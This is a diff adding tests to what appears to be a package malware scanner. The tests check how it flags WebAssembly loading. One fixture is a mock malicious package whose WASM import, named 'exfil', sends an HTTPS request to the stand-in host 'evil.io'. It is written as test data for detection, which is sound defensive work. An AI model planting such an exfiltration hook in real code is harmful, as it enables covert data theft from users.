@@ -1444,6 +1444,72 @@ module.exports = initWasm;
       assert(!t, 'Pure computation WASM should NOT trigger wasm_host_sink');
     } finally { cleanupTemp(tmp); }
   });
+
+  // ===== WASM Standalone Detection (AST-046) =====
+
+  asyncTest('AST: WebAssembly.instantiate alone → wasm_standalone MEDIUM, NOT wasm_host_sink', async () => {
+    const tmp = makeTempPkg(`
+const fs = require('fs');
+async function loadCrypto() {
+  const buf = fs.readFileSync('crypto.wasm');
+  const instance = await WebAssembly.instantiate(buf, {
+    env: { memory: new WebAssembly.Memory({ initial: 1 }) }
+  });
+  return instance.exports.hash('data');
+}
+module.exports = loadCrypto;
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const standalone = result.threats.find(t => t.type === 'wasm_standalone');
+      assert(standalone, 'Should detect wasm_standalone');
+      assert(standalone.severity === 'MEDIUM', `Severity should be MEDIUM, got ${standalone.severity}`);
+      const hostSink = result.threats.find(t => t.type === 'wasm_host_sink');
+      assert(!hostSink, 'Should NOT trigger wasm_host_sink without network');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  asyncTest('AST: WebAssembly.compile + https.request → wasm_host_sink CRITICAL, NOT wasm_standalone', async () => {
+    const tmp = makeTempPkg(`
+const fs = require('fs');
+async function init() {
+  const buf = fs.readFileSync('payload.wasm');
+  const mod = await WebAssembly.compile(buf);
+  const instance = await WebAssembly.instantiate(mod, {
+    env: {
+      exfil: (ptr, len) => {
+        const https = require('https');
+        https.request({ hostname: 'evil.io' }).end();
+      }
+    }
+  });
+}
+init();
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const hostSink = result.threats.find(t => t.type === 'wasm_host_sink');
+      assert(hostSink, 'Should detect wasm_host_sink');
+      assert(hostSink.severity === 'CRITICAL', 'wasm_host_sink should be CRITICAL');
+      const standalone = result.threats.find(t => t.type === 'wasm_standalone');
+      assert(!standalone, 'Should NOT trigger wasm_standalone when network is present');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  asyncTest('AST: No WebAssembly → neither wasm_host_sink nor wasm_standalone', async () => {
+    const tmp = makeTempPkg(`
+const fs = require('fs');
+const data = fs.readFileSync('config.json', 'utf8');
+module.exports = JSON.parse(data);
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const hostSink = result.threats.find(t => t.type === 'wasm_host_sink');
+      const standalone = result.threats.find(t => t.type === 'wasm_standalone');
+      assert(!hostSink, 'No WASM → no wasm_host_sink');
+      assert(!standalone, 'No WASM → no wasm_standalone');
+    } finally { cleanupTemp(tmp); }
+  });
   // --- Adversarial regression: EventEmitter prototype hooking ---
   asyncTest('AST: Detects events.EventEmitter.prototype.emit override', async () => {
     const tmp = makeTempPkg(`
